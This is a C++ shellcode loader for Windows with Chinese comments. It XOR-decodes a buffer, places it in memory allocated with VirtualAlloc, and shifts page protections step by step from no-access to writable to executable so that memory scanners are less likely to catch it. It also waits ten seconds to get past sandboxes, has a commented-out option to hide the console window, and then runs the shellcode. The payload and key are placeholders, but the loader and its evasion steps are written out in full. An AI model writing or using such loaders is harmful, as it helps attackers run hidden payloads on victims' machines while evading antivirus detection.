/*
--基本概要
--xor后的sc
--申请VirtualAlloc() /写入memcpy /调用(void(*))lpAdress()
*/

#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <cstring>
#include <winnls.h>
using namespace std;


#pragma comment(linker, "/section:.data,RWE") 
//隐藏控制台窗口
//#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
#pragma comment(linker, "/INCREMENTAL:NO") 

unsigned char buf[] = "shellcode-xor";
unsigned char key[sizeof(buf)] = { 99,... };

void DeXor() {
	for (int i = 0; i < sizeof(buf); i++) {
		buf[i] = buf[i] ^ key[i];
	}
}

void RunSc() {
	DeXor();	//调用解密buf函数

	//为buf动态分配内存空间，返回指向地址的指针
	LPVOID lpAddress = NULL;	//定义未知类型指针
	lpAddress = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
	//MEM_RESERVE | MEM_COMMIT = 0x3000  PAGE_EXECUTE_READWRITE = 0x40
	DWORD dw;
	Sleep(10000);
	unsigned int* lp2 = (unsigned int*)lpAddress;
	unsigned int** lp3 = &lp2;
	VirtualProtect(*lp3, sizeof(buf), PAGE_READWRITE, &dw);
	memcpy(*lp3, buf, sizeof(buf));	//将buf的数据复制给sp指向的内存空间

	VirtualProtect(*lp3, sizeof(buf), PAGE_EXECUTE, &dw);

	((void(*)())(LPVOID(*lp3)))();	//将指针lpAdress强制转换为返回值为空且参数值可变的函数指针，并调用函数
}

int main()
{
	RunSc();

	return 0;
}
